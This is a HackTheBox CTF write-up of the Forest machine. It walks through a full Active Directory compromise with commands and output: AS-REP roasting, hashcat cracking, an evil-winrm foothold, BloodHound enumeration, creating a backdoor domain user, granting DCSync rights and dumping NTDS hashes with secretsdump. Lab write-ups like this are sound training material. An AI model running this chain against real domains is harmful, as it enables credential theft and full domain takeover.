---
title: HTB - Forest
date: 2024-03-16
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, forest, nmap, hashcat, active-directory, dcsync, asreproasting, bloodhound, sharphound, impacket, secretsdump]
img_path: /assets/htb/fullpwn/forest
published: true
image:
    path: machine_info.png
---

## HTB: Forest

>[Forest Box](https://app.hackthebox.com/machines/212)

![](forest_htb_diagram.png){: .normal}

## Walkthrough Summary

|Step|Action|Tool|Achieved|
|-|-|-|-|
|1|ASREPRoasting|[GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)|Obtained the TGT ticket of _svc-alfresco_|
|2|Hash cracked|[Hashcat](https://github.com/hashcat/hashcat)|Obtained clear text password|
|3|Logged into the domain via WinRM|[evil-winrm](https://github.com/Hackplayers/evil-winrm)|Obtained initial foothold|
|4|Credentialed domain enumeration|[SharpHound.py](https://github.com/BloodHoundAD/SharpHound), [BloodHound](https://github.com/BloodHoundAD/BloodHound)|Enumerated privilege escalation path|
|5|Executed privileged escalation path|LOTL*|Created & added a domain user to the required groups|
|6|Assiged user DCSync rights|[DCSync.py](https://github.com/n00py/DCSync)|Obtained //administrator//'s NTLMv2 hash|
|7|DCSync attack|[secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)|Compromised domain|

*_[Living Off The Land](https://encyclopedia.kaspersky.com/glossary/lotl-living-off-the-land/)_

## Detailed attack chain reproduction steps

Obtained the TGT ticket of of the **_svc-alfresco_** via a ASREPRoasting:

```bash
$ getnpusers -dc-ip 10.10.10.161 -request 'htb.local/'
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2024-03-15 17:01:22.890339  2024-03-15 16:37:07.184448  0x410200

$krb5asrep$23$svc-alfresco@HTB.LOCAL:1f1...<REDACTED>...588
```

Cracked the password hash offline:

```bash
$ hashcat -m 18200 svc-alfresco_tgt /usr/share/wordlists/rockyou.txt

<SNIP>

$krb5asrep$23$svc-alfresco@HTB.LOCAL:1f1...<REDACTED>...588:s<REDACTED>e

<SNIP>
```

The obtained credentials was subsequently confirmed to the domain using [NetExec](https://github.com/Pennyw0rth/NetExec):

```bash
$ nxc smb 10.10.10.161 -u svc-alfresco -p s<REDACTED>e
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s<REDACTED>e
https://github.com/Pennyw0rth/NetExec
```

An initial foothold to the domain was achieved:

```bash
$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s<REDACTED>e

<SNIP>

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

The **_user.txt_** file was compromised:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco> type desktop\user.txt
5a4<REDACTED>f85
```

Domain information was collected and then transferred to the attack host:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco> upload SharpHound.exe

Info: Uploading /home/kali/htb/forest/SharpHound.exe to C:\Users\svc-alfresco\SharpHound.exe

Data: 965288 bytes of 965288 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco> .\SharpHound.exe -c All

*Evil-WinRM* PS C:\Users\svc-alfresco> download 20240315124803_htblocal.zip

Info: Downloading C:\Users\svc-alfresco\20240315124803_htblocal.zip to 20240315124803_htblocal.zip

Info: Download successful!
```

Upon review, two issues stood out:
  - _svc-alfresco_ was member of the _Account Operators_ group as a result of [group nesting](https://learn.microsoft.com/en-us/windows/win32/ad/nesting-a-group-in-another-group) (Figure 1)
  - The _Windows Exchange Permissions_ group had _WriteDACL_ permissions over the _HTB.LOCAL_ domain, which means that its members can obtain **DCSync rights** (Figure 2)

![Figure 1: svc-alfresco is a part of the Account Operators group.](forest_account_operators.png)

![Figure 2: The Windows Exchange Permissions group has WriteDACL rights over HTB.LOCAL.](forest_writedacl.png)

Based on the above information, a new domain user account was created and added to the _Windows Exchange Permissions_ and the _Remote Management Users_ group (to allow WinRM remote management):

```bash
# create a new domain user
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user /domain hacker hack3r123 /add
The command completed successfully.

# add user to the groups
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group /domain "Exchange Windows Permissions" hacker /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" /add hacker
The command completed successfully.
```

The user was then assigned the DCSync rights:

```bash
$ sudo python3 DCSync.py -dc htb.local -t ''CN=hacker,CN=Users,DC=htb,DC=local'' ''htb.local\hacker:hack3r123''
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

[*] Starting DCSync Attack against CN=hacker,CN=Users,DC=htb,DC=local
[*] Initializing LDAP connection to htb.local
[*] Using htb.local\hacker account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Querying domain security descriptor
[*] Success! User hacker now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20240316-103635.restore
```

The DCSync attack was performed and the _Administrator_'s NTLMv2 hash was obtained:

```bash
$ sudo /opt/impacket/examples/secretsdump.py htb.local/hacker:hack3r123@10.10.10.161
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad<REDACTED>4ee:326<REDACTED>ea6:::
<SNIP>
[*] Cleaning up...
```

The obtained hash was used to log in as _Administrator_ and achieve **full domain compromise** by obtaining the **_root.txt_** file:

```bash
$ evil-winrm -i 10.10.10.161 -u administrator -p aad<REDACTED>ea6

<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> *Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\desktop\root.txt
58a<REDACTED>525
```